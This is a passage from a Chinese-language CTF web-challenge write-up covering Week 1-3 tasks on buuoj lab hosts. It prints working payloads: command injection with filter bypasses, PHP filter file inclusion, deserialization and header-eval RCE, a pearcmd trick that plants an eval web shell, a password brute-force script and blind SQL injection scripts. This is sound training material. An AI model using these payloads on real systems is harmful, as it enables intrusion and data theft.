&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 114514
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;题目还对部分常见的恶意函数进行了过滤，但是可以通过 反引号 来执行 shell 命令，也可以通过 反斜杠 来进行绕过，Payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;password=114514&amp;amp;e[v.a.l=echo `l\s &#x2F;`;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;bin boot dev etc flag home lib lib64 media mnt opt proc root run sbin srv start.sh sys tmp usr var
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;构造 Payload 如下即可得到 flag&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;password=114514&amp;amp;e[v.a.l=echo `tac &#x2F;fl\ag`;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-1-easylogin&quot;&gt;[Week 1]EasyLogin&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-1-easylogin&quot; aria-label=&quot;Anchor link for: week-1-easylogin&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;随意注册一个账号后登录会进入终端，但在 BurpSuite 中可以发现还有一个特别的请求如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;POST &#x2F;passport&#x2F;f9e41a08a6eb869b894f509c4108adcf2213667fe2059d896886c5943156c7bc.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;该请求的回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!-- 恭喜你找到flag --&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!-- flag 为下方链接中视频简介第7行开始至第10行的全部小写字母和数字 --&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!-- https:&#x2F;&#x2F;b23.tv&#x2F;BV1SD4y1J7uY --&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;!-- 庆祝一下吧！ --&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;很显然，点进去一看是个诈骗 flag，继续研究终端的 JavaScript 源码发现这个终端是个虚假的终端，但在其中还能发现一个 &lt;code&gt;admin&lt;&#x2F;code&gt; 账号，并且存在一个提示 &lt;code&gt;Maybe you need BurpSuite.&lt;&#x2F;code&gt; ，看来用 bp 这方向没错，那就开始爆破寻找 &lt;code&gt;admin&lt;&#x2F;code&gt; 账号的密码。&lt;&#x2F;p&gt;
&lt;p&gt;从图中已知输入的密码会进行 md5 加密，通过编写 Python 脚本进行爆破，我这里爆破用的是 rockyou.txt ，可以在 Kali 中找到。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;with open(&amp;#39;&#x2F;usr&#x2F;share&#x2F;wordlists&#x2F;rockyou.txt&amp;#39;, &amp;#39;r&amp;#39;, encoding=&amp;#39;latin-1&amp;#39;) as file:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for line in file:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        line = line.strip()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        data = {&amp;quot;un&amp;quot;: &amp;quot;admin&amp;quot;, &amp;quot;pw&amp;quot;: f&amp;quot;{hashlib.md5(str(line).encode(encoding=&amp;#39;utf-8&amp;#39;)).hexdigest()}&amp;quot;, &amp;quot;rem&amp;quot;: &amp;quot;0&amp;quot;}
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        ret = requests.post(&amp;#39;http:&#x2F;&#x2F;node4.buuoj.cn:25956&#x2F;signin.php&amp;#39;, data=data)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if &amp;#39;div class=&amp;quot;alert alert-success show&amp;#39; in ret.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            print(line)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;# 000000 
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过将得到的密码手动再进行一次登录操作，就可以得到 flag 了。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-2-include-0-0&quot;&gt;[Week 2]include 0。0&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-include-0-0&quot; aria-label=&quot;Anchor link for: week-2-include-0-0&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;file=php:&#x2F;&#x2F;filter&#x2F;read=convert.%2562ase64-encode&#x2F;resource=flag.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-2-unserialize&quot;&gt;[Week 2]Unserialize？&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-unserialize&quot; aria-label=&quot;Anchor link for: week-2-unserialize&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;unser=O:4:&amp;quot;evil&amp;quot;:1:{s:3:&amp;quot;cmd&amp;quot;;s:35:&amp;quot;c\at &#x2F;th1s_1s_fffflllll4444aaaggggg&amp;quot;;}
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-2-upload-again&quot;&gt;[Week 2]Upload again!&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-upload-again&quot; aria-label=&quot;Anchor link for: week-2-upload-again&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;h4 id=&quot;htaccess-rao-guo-rao-guo&quot;&gt;.htaccess 绕过、&lt;code&gt;&amp;lt;?&lt;&#x2F;code&gt; 绕过&lt;a class=&quot;zola-anchor&quot; href=&quot;#htaccess-rao-guo-rao-guo&quot; aria-label=&quot;Anchor link for: htaccess-rao-guo-rao-guo&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h4&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;FilesMatch &amp;quot;shell.jpg&amp;quot;&amp;gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;SetHandler application&#x2F;x-httpd-php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;&#x2F;FilesMatch&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-2-r-c-e&quot;&gt;[Week 2]R!!C!!E!!&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-r-c-e&quot; aria-label=&quot;Anchor link for: week-2-r-c-e&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&#x2F;bo0g1pop.php?star=eval(array_rand(array_flip(getallheaders())));
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;User-Agent: system(&amp;quot;cat &#x2F;flag&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-2-you-xi-gao-shou&quot;&gt;[Week 2]游戏高手&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-you-xi-gao-shou&quot; aria-label=&quot;Anchor link for: week-2-you-xi-gao-shou&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;进入 Console&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;gameScore=999999999999999
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;运行玩游戏直接白给就可以得到 flag 了。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-2-ez-sql&quot;&gt;[Week 2]ez_sql&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-2-ez-sql&quot; aria-label=&quot;Anchor link for: week-2-ez-sql&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;$ python sqlmap.py -u http:&#x2F;&#x2F;ba57bf2c-be27-41e7-b824-792bf7347c7f.node4.buuoj.cn:81&#x2F;?id=TMP0919 -D ctf --tables --dump-all
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以爆破数据库名字为 &lt;code&gt;ctf&lt;&#x2F;code&gt; ，表名 &lt;code&gt;here_is_flag&lt;&#x2F;code&gt; ，字段名 &lt;code&gt;flag&lt;&#x2F;code&gt; ，以及 flag。&lt;&#x2F;p&gt;
&lt;h3 id=&quot;week-3-include-pear&quot;&gt;[Week 3]Include 🍐&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-include-pear&quot; aria-label=&quot;Anchor link for: week-3-include-pear&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;这题考察的是 LFI to RCE。&lt;&#x2F;p&gt;
&lt;p&gt;打开页面源代码如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;&amp;lt;?php
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    error_reporting(0);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    if(isset($_GET[&amp;#39;file&amp;#39;])) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        $file = $_GET[&amp;#39;file&amp;#39;];
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if(preg_match(&amp;#39;&#x2F;flag|log|session|filter|input|data&#x2F;i&amp;#39;, $file)) {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            die(&amp;#39;hacker!&amp;#39;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        include($file.&amp;quot;.php&amp;quot;);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        # Something in phpinfo.php!
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    else {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        highlight_file(__FILE__);
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;?&amp;gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过构造 payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;file=phpinfo
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以发现 env 存在属性 FLAG 值为 &lt;code&gt;fake{Check_register_argc_argv}&lt;&#x2F;code&gt; ，通过查看属性 register_argc_argv 可以发现值为 &lt;code&gt;On&lt;&#x2F;code&gt; 。&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;https:&#x2F;&#x2F;cloud.tencent.com&#x2F;developer&#x2F;article&#x2F;2204400&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;register_argc_argv 告诉PHP是否声明了 &lt;code&gt;argv&lt;&#x2F;code&gt; 和 &lt;code&gt;argc&lt;&#x2F;code&gt; 变量，这些变量可以是 POST 信息、也可以是 GET 信息，设置为 TRUE 时，能够通过 CLI SAPI 持续读取 argc 变量（传递给应用程序的若干参数）和 argv 变量（实际参数的数组），当我们使用 CLI SAPI 时，PHP变量 argc 和 argv 会自动填充为合适的值，并且可以在SERVER数组中找到这些值，比如 $_SERVER[‘argv’] 。&lt;&#x2F;p&gt;
&lt;p&gt;当构造 payload &lt;code&gt;a=a+b+c&lt;&#x2F;code&gt; 的时候，可以通过 &lt;code&gt;var_dump($_SERVER[&#x27;argv&#x27;]);&lt;&#x2F;code&gt; 输出 &lt;code&gt;array(1){[0]=&amp;gt;string(3)&quot;a=a&quot; [1]=&amp;gt;string(1)&quot;b&quot; [2]=&amp;gt;string(1)&quot;c&quot;}&lt;&#x2F;code&gt; ，即通过 &lt;code&gt;+&lt;&#x2F;code&gt; 作为分割符。&lt;&#x2F;p&gt;
&lt;p&gt;通过构造 payload 如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;file=&#x2F;usr&#x2F;local&#x2F;lib&#x2F;php&#x2F;pearcmd&amp;amp;+config-create+&#x2F;&amp;lt;?=@eval($_POST[1])?&amp;gt;+.&#x2F;1.php
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;可以得到回显如下&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Successfully created default configuration file &amp;quot;&#x2F;var&#x2F;www&#x2F;html&#x2F;1.php&amp;quot;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;通过访问 &lt;code&gt;1.php&lt;&#x2F;code&gt; ，并构造 payload 如下即可得到 flag。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;1=system(&amp;quot;cat &#x2F;flag&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;h3 id=&quot;week-3-medium-sql&quot;&gt;[Week 3]medium_sql&lt;a class=&quot;zola-anchor&quot; href=&quot;#week-3-medium-sql&quot; aria-label=&quot;Anchor link for: week-3-medium-sql&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;根据题目描述可以得出需要进行一些绕过，先查看那些关键词被过滤了。&lt;&#x2F;p&gt;
&lt;p&gt;过滤关键词：union、# ，发现回显只有 &lt;code&gt;id not exists&lt;&#x2F;code&gt; 还有 ID 正确时的输出，故尝试布尔注入，经测试 &lt;code&gt;select、or、where、ascii&lt;&#x2F;code&gt; 需要进行大小写绕过。&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import requests
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;import time
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;target = &amp;quot;http:&#x2F;&#x2F;c14df6c5-9f87-4cfa-bd7a-9dd3bca93bf4.node4.buuoj.cn:81&#x2F;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getDataBase():  # 获取数据库名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    database_name = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, 1000):  # 注意是从1开始，substr函数从第一个字符开始截取
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        low = 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        high = 127
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while low &amp;lt; high:  # 二分法
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            params = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                &amp;quot;id&amp;quot;: &amp;quot;TMP0919&amp;#39; And (Ascii(suBstr((sElect(database())),&amp;quot; + str(i) + &amp;quot;,1))&amp;gt;&amp;quot; + str(mid) + &amp;quot;)%23&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            time.sleep(0.1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            r = requests.get(url=target+&amp;#39;?id=&amp;#39;+params[&amp;quot;id&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if &amp;quot;Physics&amp;quot; in r.text:  # 为真时说明该字符在ascii表后面一半
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                low = mid + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                high = mid
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if low &amp;lt;= 32 or high &amp;gt;= 127:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        database_name += chr(mid)  # 将ascii码转换为字符
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(database_name)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;quot;数据库名：&amp;quot; + database_name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getTable():  # 获取表名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    column_name = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, 1000):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        low = 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        high = 127
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while low &amp;lt; high:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            params = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                &amp;quot;id&amp;quot;: &amp;quot;TMP0919&amp;#39; And (Ascii(suBstr((sElect(group_concat(table_name))from(infOrmation_schema.tables)wHere(table_schema=&amp;#39;ctf&amp;#39;)),&amp;quot; + str(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    i) + &amp;quot;,1))&amp;gt;&amp;quot; + str(mid) + &amp;quot;)%23&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            time.sleep(0.1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            r = requests.get(url=target + &amp;#39;?id=&amp;#39; + params[&amp;quot;id&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if &amp;quot;Physics&amp;quot; in r.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                low = mid + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                high = mid
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if low &amp;lt;= 32 or high &amp;gt;= 127:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        column_name += chr(mid)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(column_name)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;quot;表名为：&amp;quot; + column_name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getColumn():  # 获取列名
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    column_name = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, 250):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        low = 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        high = 127
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while low &amp;lt; high:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            params = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                &amp;quot;id&amp;quot;: &amp;quot;TMP0919&amp;#39; And (Ascii(suBstr((sElect(group_concat(column_name))from(infOrmation_schema.columns)wHere(table_name=&amp;#39;here_is_flag&amp;#39;)),&amp;quot; + str(
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                    i) + &amp;quot;,1))&amp;gt;&amp;quot; + str(mid) + &amp;quot;)%23&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            time.sleep(0.1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            r = requests.get(url=target + &amp;#39;?id=&amp;#39; + params[&amp;quot;id&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if &amp;#39;Physics&amp;#39; in r.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                low = mid + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                high = mid
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if low &amp;lt;= 32 or high &amp;gt;= 127:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        column_name += chr(mid)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(column_name)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;quot;列名为：&amp;quot; + column_name
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;def getFlag():  # 获取flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    flag = &amp;quot;&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    for i in range(1, 1000):
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        low = 32
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        high = 127
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        while low &amp;lt; high:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            params = {
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                &amp;quot;id&amp;quot;: &amp;quot;TMP0919&amp;#39; And (Ascii(suBstr((sElect(group_concat(flag))from(here_is_flag)),&amp;quot; + str(i) + &amp;quot;,1))&amp;gt;&amp;quot; + str(mid) + &amp;quot;)%23&amp;quot;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            }
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            time.sleep(0.1)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            r = requests.get(url=target + &amp;#39;?id=&amp;#39; + params[&amp;quot;id&amp;quot;])
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            if &amp;#39;Physics&amp;#39; in r.text:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                low = mid + 1
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            else:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;                high = mid
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            mid = (low + high) &#x2F;&#x2F; 2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        if low &amp;lt;= 32 or high &amp;gt;= 127:
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;            break
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        flag += chr(mid)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;        print(flag)
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;    return &amp;quot;flag:&amp;quot; + flag
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;a = getDataBase()
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;b = getTable()
